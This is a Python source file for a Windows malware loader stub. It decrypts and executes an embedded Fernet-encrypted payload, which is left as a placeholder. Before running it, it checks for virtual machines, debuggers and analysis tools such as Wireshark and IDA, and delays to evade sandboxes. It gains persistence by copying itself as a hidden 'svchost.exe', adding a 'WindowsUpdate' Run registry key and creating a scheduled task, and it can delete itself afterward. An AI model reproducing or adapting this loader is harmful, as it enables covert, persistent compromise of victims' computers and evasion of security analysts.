import os
import sys
import base64
import ctypes
import time
import random
import string
import subprocess
import tempfile
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple

try:
    from cryptography.fernet import Fernet
except ImportError:
    pass

# Configuration
ENCRYPTED_PAYLOAD = "REPLACE_WITH_ENCRYPTED_PAYLOAD"
ENCRYPTION_KEY = "REPLACE_WITH_ENCRYPTION_KEY"
SLEEP_TIME = 5
JITTER = 3
ANTI_VM = True
ANTI_DEBUG = True
ANTI_ANALYSIS = True
PERSISTENCE = True
MELT_AFTER_EXECUTION = False

class StubObfuscator:
    def __init__(self):
        self.decoy_strings = []
        self.generate_decoy_strings()
    
    def generate_decoy_strings(self):
        decoys = [
            "Windows Update Service",
            "Microsoft Corporation",
            "System32",
            "svchost.exe",
            "kernel32.dll",
            "ntdll.dll",
            "Windows Defender",
            "Security Center",
            "Task Manager",
            "Registry Editor"
        ]
        
        self.decoy_strings = decoys
    
    def get_decoy_string(self):
        return random.choice(self.decoy_strings)

def check_vm():
    try:
        import psutil
        total_ram = psutil.virtual_memory().total
        if total_ram < 2 * 1024 * 1024 * 1024:
            return True
        
        cpu_count = psutil.cpu_count()
        if cpu_count < 1:
            return True
    except:
        pass
    
    try:
        import wmi
        c = wmi.WMI()
        for disk in c.Win32_DiskDrive():
            model = str(disk.Model).lower()
            if any(x in model for x in ["vbox", "vmware", "qemu", "virtual", "xen", "hyper-v"]):
                return True
    except:
        pass
    
    # Check MAC address
    try:
        import uuid
        mac = uuid.getnode()
        mac_str = ':'.join(['{:02x}'.format((mac >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
        
        vm_mac_prefixes = [
            "00:0c:29", "00:1c:14", "00:50:56", "00:05:69",
            "08:00:27", "00:16:3e", "00:15:5d"
        ]
        
        for prefix in vm_mac_prefixes:
            if mac_str.startswith(prefix):
                return True
    except:
        pass
    
    return False

def check_debugger():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except:
        pass
    
    try:
        remote_debugger = ctypes.c_bool(False)
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
            ctypes.windll.kernel32.GetCurrentProcess(),
            ctypes.byref(remote_debugger)
        )
        
        if remote_debugger.value:
            return True
    except:
        pass
    
    return False

def check_analysis_tools():
    tools = [
        "wireshark.exe", "procmon.exe", "processhacker.exe",
        "processexplorer.exe", "fiddler.exe", "ollydbg.exe",
        "x64dbg.exe", "x32dbg.exe", "windbg.exe", "ida.exe"
    ]
    
    try:
        output = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL).decode().lower()
        
        for tool in tools:
            if tool in output:
                return True
    except:
        pass
    
    return False

def random_delay():
    delay = SLEEP_TIME + random.uniform(0, JITTER)
    time.sleep(delay)
    return delay

def establish_persistence():
    try:
        # Copy to AppData
        appdata = os.getenv("APPDATA")
        target_dir = os.path.join(appdata, "Microsoft", "Windows", "Update")
        os.makedirs(target_dir, exist_ok=True)
        target_path = os.path.join(target_dir, "svchost.exe")
        
        if not os.path.exists(target_path) or os.path.getsize(target_path) != os.path.getsize(sys.executable):
            import shutil
            shutil.copy2(sys.executable, target_path)
            
            # Set hidden attribute
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN)
        
        # Registry Run Key
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(key)
        
        # Scheduled Task
        task_cmd = f'schtasks /create /tn "WindowsUpdateTask" /tr "{target_path}" /sc hourly /mo 2 /f'
        subprocess.Popen(task_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        return True
    except:
        return False

def decrypt_payload():
    try:
        encrypted_data = base64.b64decode(ENCRYPTED_PAYLOAD)
        cipher = Fernet(ENCRYPTION_KEY.encode())
        decrypted = cipher.decrypt(encrypted_data)
        return decrypted.decode()
    except:
        return None

def execute_payload(payload):
    try:
        # Write payload to temp file
        temp_dir = tempfile.mkdtemp()
        payload_file = os.path.join(temp_dir, "payload.py")
        
        with open(payload_file, "w", encoding="utf-8") as f:
            f.write(payload)
        
        # Execute payload
        exec(compile(payload, payload_file, 'exec'), {'__name__': '__main__'})
        
        # Cleanup
        try:
            os.remove(payload_file)
            os.rmdir(temp_dir)
        except:
            pass
        
        return True
    except:
        return False

def self_destruct():
    try:
        # Create batch script to delete executable
        batch_content = f"""
@echo off
timeout /t 2 /nobreak > nul
del /f /q "{sys.executable}"
del /f /q "%0"
"""
        
        batch_path = os.path.join(tempfile.gettempdir(), "cleanup.bat")
        
        with open(batch_path, "w") as f:
            f.write(batch_content)
        
        subprocess.Popen(batch_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        sys.exit(0)
    except:
        pass

def main():
    try:
        # Decoy operations
        stub = StubObfuscator()
        decoy = stub.get_decoy_string()
        
        # Random delay to avoid sandbox detection
        random_delay()
        
        # Evasion checks
        if ANTI_VM and check_vm():
            return
        
        if ANTI_DEBUG and check_debugger():
            return
        
        if ANTI_ANALYSIS and check_analysis_tools():
            return
        
        # Establish persistence
        if PERSISTENCE:
            establish_persistence()
        
        # Decrypt payload
        payload = decrypt_payload()
        
        if payload:
            # Execute payload
            execute_payload(payload)
        
        # Self destruct if configured
        if MELT_AFTER_EXECUTION:
            self_destruct()
        
    except Exception as e:
        # Silent fail
        pass

if __name__ == "__main__":
    main()